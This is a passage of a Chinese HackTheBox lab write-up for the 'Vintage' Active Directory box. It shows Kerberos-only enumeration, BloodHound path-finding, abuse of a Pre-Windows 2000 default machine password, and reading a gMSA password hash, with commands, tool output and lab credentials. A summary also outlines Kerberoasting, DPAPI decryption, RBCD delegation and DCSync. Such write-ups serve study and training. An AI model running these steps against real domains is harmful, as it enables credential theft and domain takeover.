---
title: 【先知】HTB-Vintage：从 Pre-Win2k 默认凭据到 RBCD 委派提权的域渗透实战
source: https://xz.aliyun.com/news/92703
source_host: xz.aliyun.com
clip_date: 2026-08-20T14:13:24+08:00
trace_id: c6484af5-3a99-446e-99c6-1bf15ab0d976
content_hash: 64356bbfeceaf2fa9ca1f4150d9abbad42c2d6ab02186778e3792c12ac1ff2d2
status: synced
tags:
  - 先知
  - 域渗透
  - Kerberos
series: null
feed_source: 先知安全技术社区
ai_summary: 通过 FS01$ 的 Pre-Win2k 默认机器密码进入横向链路，配合 GMSA 密码读取、Kerberoasting 与 RBCD 委派，最终 DCSync 拿下域管权限。
ai_summary_style: key-points
images_status:
  total: 16
  succeeded: 16
  failed_urls: []
notion_page_id: 3c275244-d011-8116-a52b-fa3afa075d82
ioc:
  cves: []
  cwes: []
  hashes:
    - 0e928eb709d7560f8e45be1611c64c003200f07c8498ab4d174d11fc57a9e0d2
    - 0f922f4956476de10f59561106aba118
    - 14d4ea3f6cd908d23889e816cd8afa85aa6f398091aa1ab0d5cd1710e48637e6
    - 1cdedaa6c2d42fe2771f8f3f1a1e250a
    - 1cfcf828c8f7c18618168fe1487e34c1
    - 1d1c5d252941e889d2f3afdd7e0b53bf
    - 2dc5282ca43835331648e7e0bd41f2d5
    - 31d6cfe0d16ae931b73c59d7e0c089c0
    - 367a8af99390ebd9f05067ea4da6a73b
    - 3bc255d2549199bbed7d8e670f63ee395cf3429b8080e8067eeea0b6fc9941ae
    - 3c7375304a46526c00b9a7c341699bc0
    - 3f974cd6254cb7808040db9e57f7e8b4
    - 42232fb11274c292ed84dcbcc200db57
    - 44a59c02ec44a90366ad1d0f8a781274
    - 458fd9b330df2eff17c42198627169aa
    - 468c7497513f8243b59980f2240a10de
    - 529fa80540d759052c6beb161d5982435a37811b3ad2a338e81b75797c11959e
    - 55aec332255b6da8c1344357457ee717
    - 587368d45a7559a1678b842c5c829fb3
    - 5f22c4cf44bc5277d90b8e281b9ba3735636bd95a72f3870ae3de93513ce63c5
    - 69793656a20775f8d555075b602ac1c2
    - 6b751449807e0d73065b0423b64687f0
    - 6d8f13cee54c56bf541cfc162e8a22ef
    - 7e4599a7f84c2868e20141bdc8608bd7
    - 820c3471b64d94598ca48223f4a2ebc2491c0842a84fe964a07e4ee29f63d181
    - 8c241d5fe65f801b408c96776b38fba2
    - 8d969dafdd00d594adfc782f13ababebbada96751ec4096bce85e122912ce1f0
    - 8e5fc7685b7ae019a516c2515bbd310d
    - 91c4418311c6e34bd2e9a3bda5e96594
    - 92067d46b54cdb11b4e9a7e650beb122
    - 96072929a1b054f5616e3e0d0edb6abf426b4a471cce18809b65559598d722ff
    - a46cac126e723b4ae68d66001ab9135ef30aa4b7c0eb1ca1663495e15fe05e75
    - a8f037cb02f93e9b779a84441be1606a
    - aad3b435b51404eeaad3b435b51404ee
    - abcbbd86203a64f177288ed73737db05718cead35edebd26740147bd73e9cfed
    - bd949958ed381aa4cd13011375aea320670a891331b1dfe692ad47ab29690ee8
    - be3d376d906753c7373b15ac460724d8
    - bf4c77d9591294b218b8280c7235c684
    - c119630313138df8cd2e98b5e2d018f7
    - c3e84a0d7b3234160e092f168ae2a19366465d0a4eab1e38065e79b99582ea31
    - c4bb96844a5c9dd45d5b6a9859252ba6
    - c8b4d30ca7a9541bdbeeba0079f3a9383b127c8abf938de10d33d3d7c3b0fd06
    - cc5156663cd522d5fa1931f6684af639
    - cfc747dd455186dba6a67a2a340236ad
    - d146fa335a9a7d2199f0dd969c0603fb
    - d2c155692372989ed80a8533eaa7acb8
    - d57d94936002c8725eab5488773cf2bae32328e1ba7ffcfa15b81d4efab4bb02
    - d5cb431d39efdda93b6dbcf9ce2dfeffb27bd15d60ebf0d21cd55daac4a374f2
    - ddf2a2dcc7a6080ea3aafbdf277f4958
    - de9f0e05b3eaa440b2842b8fe3449545
    - e082d85e0e0e5c2132e116c852cd1159
    - ed3b9d69e24d84af130bdc133e517af0
    - ee1b8c5cdc46772aff6f4bbab036debf
    - f3b3398a6cae16ec640018a13a1e70fc38929cfe4f930e03b1c6f1081901844a
    - f8ceb2e0ea58bf929e6473df75802ec8efcca13135edb999fcad20430dc06d4b
    - f9c16db419c9d4cb6ec6242484a522f55fc891d2ff943fc70c156a1fab1ebdb1
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 通过 FS01$ 的 Pre-Win2k 默认机器密码进入横向链路，配合 GMSA 密码读取、Kerberoasting 与 RBCD 委派，最终 DCSync 拿下域管权限。
> 
> - **环境约束：** 目标为 vintage.htb 域控 DC01，全端口扫描发现 53/88/389/445/5985 等典型 AD 服务；服务器禁用 NTLM，SMB、LDAP、WinRM 均须走 Kerberos 认证。
> - **初始突破：** 使用 P.Rosa:Rosaisbest123 枚举后，BloodHound 发现 FS01$ 属 PRE-WINDOWS 2000 COMPATIBLE ACCESS 组，其密码等于小写机器名 `fs01`；凭据验证成功。
> - **权限链扩展：** 利用 FS01$ 读取 gMSA01$ 的 NTLM `e082d85e0e0e5c2132e116c852cd1159`；gMSA01$ 加入 SERVICEMANAGERS 组后获得对 svc_sql/svc_ldap/svc_ark 的 GenericAll；因 PKINIT 失败，改为添加 SPN 并进行 Kerberoasting，破解出 C.Neri 密码 `Zer0the0ne`。
> - **DPAPI 解密：** C.Neri 会话中下载加密凭据与 Master Key，用 dpapi.py 解出 c.neri_adm 密码 `Uncr4ck4bl3P4ssW0rd0312`。
> - **最终提权：** c.neri_adm 对 DELEGATEDADMINS 组有 GenericWrite，将 FS01$ 加入该组，用 getST.py 执行 RBCD 模拟 DC01$ 获取 LDAP 服务票据，再 secretsdump.py DCSync 取得 Administrator 哈希；Administrator 被禁止登录，改用同为域管的 L.Bianchi_adm 登录 WinRM 读取 root.txt。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ec23543965165ffe.png)

## 一、Nmap

TCP 全端口扫描：

```bash
$ sudo nmap -sS -p- -Pn -n -T4 --min-rate 5000 10.129.231.205 -oA tcp_ports
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-12 23:37 EDT
Nmap scan report for 10.129.231.205
Host is up (0.0073s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49676/tcp open  unknown
49689/tcp open  unknown
59562/tcp open  unknown
```

对开放端口进行详细扫描：

```bash
$ sudo nmap -sC -sV --reason -Pn -n -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49689,59562 10.129.231.205 -oA tcp_ports_detail 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-12 23:41 EDT
Nmap scan report for 10.129.231.205
Host is up, received user-set (0.0075s latency).

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-08-13 03:41:13Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59562/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-13T03:42:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.40 seconds
```

根据端口的开放情况，判断出目标是 AD 中的 DC。

将扫描结果中的域名添加进本地 `hosts` 文件中：

```bash
$ echo '10.129.231.205 vintage.htb dc01.vintage.htb' | sudo tee -a /etc/hosts
```

## 二、枚举

靶机提供了初始凭据：

```plain
username: P.Rosa
password: Rosaisbest123
```

### 1、SMB

通过 SMB 枚举共享资源：

```bash
$ netexec smb 10.129.231.205 -u 'P.Rosa' -p 'Rosaisbest123' --shares
SMB         10.129.231.205  445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.231.205  445    dc01             [-] vintage.htb\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

`NTLM:False` 意味着服务器禁用了通过 `NTLM` 认证建立 SMB Session，只能用 `Kerberos` 。

> 经过测试，本靶机中的其他服务（LDAP、WinRM等）均需要通过 Kerberos 进行认证。

带上 `-k` 参数， `netexec` 会先完成 SMB 服务的 ST 的申请，再完成 SMB Session 的建立：

```bash
$ netexec smb 10.129.231.205 -u 'P.Rosa' -p 'Rosaisbest123' -k --shares
SMB         10.129.231.205  445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.231.205  445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123
SMB         10.129.231.205  445    dc01             [*] Enumerated shares
SMB         10.129.231.205  445    dc01             Share           Permissions            Remark
SMB         10.129.231.205  445    dc01             -----           -----------            ------
SMB         10.129.231.205  445    dc01             ADMIN$                                 Remote Admin
SMB         10.129.231.205  445    dc01             C$                                     Default share
SMB         10.129.231.205  445    dc01             IPC$            READ                   Remote IPC
SMB         10.129.231.205  445    dc01             NETLOGON        READ                   Logon server share
SMB         10.129.231.205  445    dc01             SYSVOL          READ                   Logon server share
```

三个可读共享资源（其中一个（ `IPC$` ）为命名管道共享，并非磁盘文件共享），但均为常规共享。

并没有发现什么有趣的内容：

```bash
$ netexec smb 10.129.231.205 -u 'P.Rosa' -p 'Rosaisbest123' -k --spider NETLOGON --pattern ''
SMB         10.129.231.205  445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.231.205  445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123
SMB         10.129.231.205  445    dc01             [*] Spidering .
SMB         10.129.231.205  445    dc01             //10.129.231.205/NETLOGON/. [dir]
SMB         10.129.231.205  445    dc01             //10.129.231.205/NETLOGON/.. [dir]
```

```bash
$ netexec smb 10.129.231.205 -u 'P.Rosa' -p 'Rosaisbest123' -k --spider SYSVOL --pattern '' >> smb_sysvol

$ cat smb_sysvol | rg -v '\[\*\]|\[dir\]|\[\+\]'
SMB                      10.129.231.205  445    dc01             //10.129.231.205/SYSVOL/vintage.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI [lastm:'2024-06-05 18:33' size:22]
SMB                      10.129.231.205  445    dc01             //10.129.231.205/SYSVOL/vintage.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol [lastm:'2024-06-05 18:33' size:2790]
SMB                      10.129.231.205  445    dc01             //10.129.231.205/SYSVOL/vintage.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf [lastm:'2024-06-05 18:27' size:1098]
SMB                      10.129.231.205  445    dc01             //10.129.231.205/SYSVOL/vintage.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI [lastm:'2024-06-07 22:04' size:22]
SMB                      10.129.231.205  445    dc01             //10.129.231.205/SYSVOL/vintage.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf [lastm:'2024-06-07 22:04' size:4724]
```

### 2、LDAP

通过 LDAP 枚举用户：

```bash
$ netexec ldap 10.129.231.205 -u 'P.Rosa' -p 'Rosaisbest123' -k --users
LDAP        10.129.231.205  389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.129.231.205  389    DC01             [+] vintage.htb\P.Rosa:Rosaisbest123
LDAP        10.129.231.205  389    DC01             [*] Enumerated 14 domain users: vintage.htb
LDAP        10.129.231.205  389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                     
LDAP        10.129.231.205  389    DC01             Administrator                 2024-06-08 19:34:54 0        Built-in account for administering the computer/domain
LDAP        10.129.231.205  389    DC01             Guest                         2024-11-13 22:16:53 1        Built-in account for guest access to the computer/domain
LDAP        10.129.231.205  389    DC01             krbtgt                        2024-06-05 18:27:35 0        Key Distribution Center Service Account
LDAP        10.129.231.205  389    DC01             M.Rossi                       2024-06-05 21:31:08 1                                          
LDAP        10.129.231.205  389    DC01             R.Verdi                       2024-06-05 21:31:08 1                                          
LDAP        10.129.231.205  389    DC01             L.Bianchi                     2024-06-05 21:31:08 1                                          
LDAP        10.129.231.205  389    DC01             G.Viola                       2024-06-05 21:31:08 1                                          
LDAP        10.129.231.205  389    DC01             C.Neri                        2024-06-06 05:08:13 0                                          
LDAP        10.129.231.205  389    DC01             P.Rosa                        2024-11-06 20:27:16 0                                          
LDAP        10.129.231.205  389    DC01             svc_sql                       2026-08-13 15:12:06 1                                          
LDAP        10.129.231.205  389    DC01             svc_ldap                      2024-06-06 21:45:27 1                                          
LDAP        10.129.231.205  389    DC01             svc_ark                       2024-06-06 21:45:27 1                                          
LDAP        10.129.231.205  389    DC01             C.Neri_adm                    2024-06-07 18:54:14 0                                          
LDAP        10.129.231.205  389    DC01             L.Bianchi_adm                 2024-11-26 19:40:30 0
```

将结果整理成用户字典：

```bash
$ cat users.txt
Administrator
Guest
krbtgt
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```

以 `objectClass=*` 作为 Filter 进行 LDAP Search：

```bash
$ netexec ldap 10.129.231.205 -u 'P.Rosa' -p 'Rosaisbest123' -k --query '(objectClass=*)' '' >> ldapsearch_results
```

有 4000 多行结果：

```bash
$ wc -l ldapsearch_results
4698 ldapsearch_results
```

筛选感兴趣的内容：

```bash
$ cat ldapsearch_results | rg -i --text 'pwd|password|default|secret' | rg -v 'badPasswordTime|pwdLastSet' | awk '!seen[$0]++'
LDAP                     10.129.231.205  389    DC01             maxPwdAge            -36288000000000
LDAP                     10.129.231.205  389    DC01             minPwdAge            -864000000000
LDAP                     10.129.231.205  389    DC01             minPwdLength         7
LDAP                     10.129.231.205  389    DC01             pwdProperties        1
LDAP                     10.129.231.205  389    DC01             pwdHistoryLength     24
LDAP                     10.129.231.205  389    DC01             fSMORoleOwner        CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             masteredBy           CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             msDs-masteredBy      CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             msDS-IsDomainFor     CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             msDS-ExpirePasswordsOnSmartCardOnlyAccounts TRUE
LDAP                     10.129.231.205  389    DC01             description          Default container for upgraded user accounts
LDAP                     10.129.231.205  389    DC01             description          Default container for upgraded computer accounts
LDAP                     10.129.231.205  389    DC01             description          Default container for domain controllers
LDAP                     10.129.231.205  389    DC01             description          Default container for orphaned objects
LDAP                     10.129.231.205  389    DC01             description          Default container for security identifiers (SIDs) associated with objects from external, trusted domains
LDAP                     10.129.231.205  389    DC01             description          Default location for storage of application data.
LDAP                     10.129.231.205  389    DC01             description          Default location for storage of Microsoft application data.
LDAP                     10.129.231.205  389    DC01             description          Default container for managed service accounts
LDAP                     10.129.231.205  389    DC01             [+] Response for object: CN=Default Domain Policy,CN=System,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             cn                   Default Domain Policy
LDAP                     10.129.231.205  389    DC01             distinguishedName    CN=Default Domain Policy,CN=System,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             name                 Default Domain Policy
LDAP                     10.129.231.205  389    DC01             [+] Response for object: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             distinguishedName    CN=AppCategories,CN=Default Domain Policy,CN=System,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             displayName          Default Domain Policy
LDAP                     10.129.231.205  389    DC01             displayName          Default Domain Controllers Policy
LDAP                     10.129.231.205  389    DC01             [+] Response for object: CN=Password Settings Container,CN=System,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             badPwdCount          0
LDAP                     10.129.231.205  389    DC01             badPwdCount          1
LDAP                     10.129.231.205  389    DC01             maxPwdAge            -37108517437440
LDAP                     10.129.231.205  389    DC01             minPwdAge            0
LDAP                     10.129.231.205  389    DC01             minPwdLength         0
LDAP                     10.129.231.205  389    DC01             pwdProperties        0
LDAP                     10.129.231.205  389    DC01             pwdHistoryLength     0
LDAP                     10.129.231.205  389    DC01             description          Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
LDAP                     10.129.231.205  389    DC01             serverReferenceBL    CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             memberOf             CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             [+] Response for object: CN=Allowed RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             cn                   Allowed RODC Password Replication Group
LDAP                     10.129.231.205  389    DC01             description          Members in this group can have their passwords replicated to all read-only domain controllers in the domain
LDAP                     10.129.231.205  389    DC01             distinguishedName    CN=Allowed RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             name                 Allowed RODC Password Replication Group
LDAP                     10.129.231.205  389    DC01             sAMAccountName       Allowed RODC Password Replication Group
LDAP                     10.129.231.205  389    DC01             [+] Response for object: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             cn                   Denied RODC Password Replication Group
LDAP                     10.129.231.205  389    DC01             description          Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
LDAP                     10.129.231.205  389    DC01             distinguishedName    CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             name                 Denied RODC Password Replication Group
LDAP                     10.129.231.205  389    DC01             sAMAccountName       Denied RODC Password Replication Group
LDAP                     10.129.231.205  389    DC01             serverReference      CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             msDS-ManagedPasswordId b'\x01\x00\x00\x00KDSK\x02\x00\x00\x00j\x01\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\xd7d\x14?{P\x9e\x98_J\x93\xe3$QM\xf1\x00\x00\x00\x00\x18\x00\x00\x00\x18\x00\x00\x00v\x00i\x00n\x00t\x00a\x00g\x00e\x00.\x00h\x00t\x00b\x00\x00\x00v\x00i\x00n\x00t\x00a\x00g\x00e\x00.\x00h\x00t\x00b\x00\x00\x00'
LDAP                     10.129.231.205  389    DC01             msDS-ManagedPasswordInterval 30
LDAP                     10.129.231.205  389    DC01             [+] Response for object: CN=BCKUPKEY_351774c3-74aa-415c-9022-e8d63e1d5cdc Secret,CN=System,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             [+] Response for object: CN=BCKUPKEY_P Secret,CN=System,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             [+] Response for object: CN=BCKUPKEY_709fdaa7-e5fe-45d4-b453-555506f0d4f0 Secret,CN=System,DC=vintage,DC=htb
LDAP                     10.129.231.205  389    DC01             [+] Response for object: CN=BCKUPKEY_PREFERRED Secret,CN=System,DC=vintage,DC=htb
```

没什么有意思的信息。

查看密码策略：

```bash
$ cat ldapsearch_results | rg -i --text 'lockout'
LDAP                     10.129.231.205  389    DC01             lockoutDuration      -18000000000
LDAP                     10.129.231.205  389    DC01             lockOutObservationWindow -18000000000
LDAP                     10.129.231.205  389    DC01             lockoutThreshold     0
LDAP                     10.129.231.205  389    DC01             lockoutDuration      -18000000000
LDAP                     10.129.231.205  389    DC01             lockOutObservationWindow -18000000000
LDAP                     10.129.231.205  389    DC01             lockoutThreshold     0
```

没有开启账户锁定。

### 3、WinRM

`netexec` 目前并不支持以 Kerberos 认证的方式访问 WinRM：

```bash
$ netexec winrm 10.129.231.205 -u 'P.Rosa' -p 'Rosaisbest123' -k
[15:40:36] ERROR    Invalid NTLM challenge received from server. This may indicate NTLM is not supported and nxc winrm only support   winrm.py:66
                    NTLM currently
WINRM       10.129.231.205  5985   10.129.231.205   [*] None (name:10.129.231.205) (domain:None) (NTLM:False)
```

通过 `netexec` 能生成针对靶机的 Kerberos 配置文件：

```bash
$ netexec smb 10.129.231.205 -u 'P.Rosa' -p 'Rosaisbest123' -k --generate-krb5-file krb5.conf
SMB         10.129.231.205  445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.231.205  445    dc01             [+] krb5 conf saved to: krb5.conf
SMB         10.129.231.205  445    dc01             [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         10.129.231.205  445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123
```

将生成的文件中的内容填入 `/etc/krb5.conf` 中（将原先的内容删除）：

```bash
$ cat /etc/krb5.conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VINTAGE.HTB

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
        default_domain = vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB
```

时间同步：

```bash
$ sudo ntpdate 10.129.231.205
2026-08-13 15:42:27.788308 (+0800) +0.004543 +/- 0.108171 10.129.231.205 s1 no-leap
```

> Kerberos 对时间敏感，做 Kerber 相关操作前先进行时间同步是一个好习惯（虽然我经常等出问题了才想起这一步……）。

通过 `kinit` 申请 TGT：

```bash
$ kinit P.Rosa@VINTAGE.HTB
Password for P.Rosa@VINTAGE.HTB:
```

查看：

```bash
$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: P.Rosa@VINTAGE.HTB

Valid starting       Expires              Service principal
2026-08-13T15:52:02  2026-08-14T01:52:02  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 2026-08-14T15:51:53
```

将环境变量中的 `KRB5CCNAME` 的值指向该文件：

```bash
$ export KRB5CCNAME=/tmp/krb5cc_1000
```

通过 `evil-winrm` 尝试使用该 TGT 访问 WinRM：

```bash
$ evil-winrm -i dc01.vintage.htb -r VINTAGE.HTB

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success


Error: Exiting with code 1
```

失败了，应该是当前用户并不具备权限访问 WinRM。

## 三、AS-REP Roasting

针对未开启预认证的账户，我可以成功申请到 TGT，并在 AS-REP 中截获 Hash 以及用用户长期密钥加密的信息，并在本地使用 `Hashcat` 进行暴力破解。

这将有概率让我获取新的凭据。

利用：

```bash
$ netexec ldap 10.129.231.205 -u users.txt -p '' -k --asreproast output.txt
LDAP        10.129.231.205  389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.129.231.205  389    DC01             [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.129.231.205  389    DC01             [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.129.231.205  389    DC01             [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

无结果。

## 四、BloodHound

远程采集：

```bash
$ bloodhound-ce-python -u 'P.Rosa' -p 'Rosaisbest123' -k -ns 10.129.231.205 -d vintage.htb -c all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: vintage.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.231.205@53 answered The DNS operation timed out.
INFO: Done in 00M 47S
INFO: Compressing output into 20260813162652_bloodhound.zip
```

将生成的 `zip` 上传到 BloodHound 中。

发现了除了 DC01 外的另外一台主机：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/f1d901d898d2644b.png)

查看其出边：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/305779a55c6f199f.png)

该主机属于 DOMAIN COMPUTERS 组，该组拥有对 `GMSA01$` 账户的 `ReadGMSAPassword` 权限。

> GMSA 是一种特殊的服务账户，由域控自动管理其密码。密码通常加密存储在该用户的 `msDS-ManagedPassword` 属性中，仅授权对象才能读取。

该机器账户对 SERVICEMANAGERS 组拥有 AddSelf 权限：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/8675d3180dfe1794.png)

即能将自己加入该组中。

而 SERVICEMANAGERS 组对三个用户拥有 `GenericAll` 权限：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/c4dda7499e6ce3e7.png)

这意味着，如果我能拿下 `FS01$` 即可通过上述路径获得三个新的凭据。

我发现 FS01 被加入了 `PRE-WINDOWS 2000 COMPATIBLE ACCESS` 组：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/e60934fa1793a3ca.png)

在 trustedsec 团队的一篇 [博客](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts) 中提到：

> 如果某个帐户在创建时勾选了"将此计算机帐户分配为 pre-windows 2000 computer"复选框，那么该帐户的密码就会与计算机帐户的小写形式相同。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/3625ae91428a6a65.png)

（源于： [博客](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts) ）

尝试：

```bash
$ netexec smb 10.129.231.205 -u 'fs01$' -p 'fs01' -k
SMB         10.129.231.205  445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.231.205  445    dc01             [+] vintage.htb\fs01$:fs01
```

凭据有效。

按照之前说的攻击路径，先获取 GMSA01$ 的密码：

```bash
$ netexec ldap 10.129.231.205 -u 'fs01$' -p 'fs01' --gmsa -k
LDAP        10.129.231.205  389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.129.231.205  389    DC01             [+] vintage.htb\fs01$:fs01
LDAP        10.129.231.205  389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.231.205  389    DC01             Account: gMSA01$              NTLM: e082d85e0e0e5c2132e116c852cd1159     PrincipalsAllowedToReadPassword: Domain Computers
LDAP        10.129.231.205  389    DC01             Account: gMSA01$              aes128-cts-hmac-sha1-96: d2c155692372989ed80a8533eaa7acb8
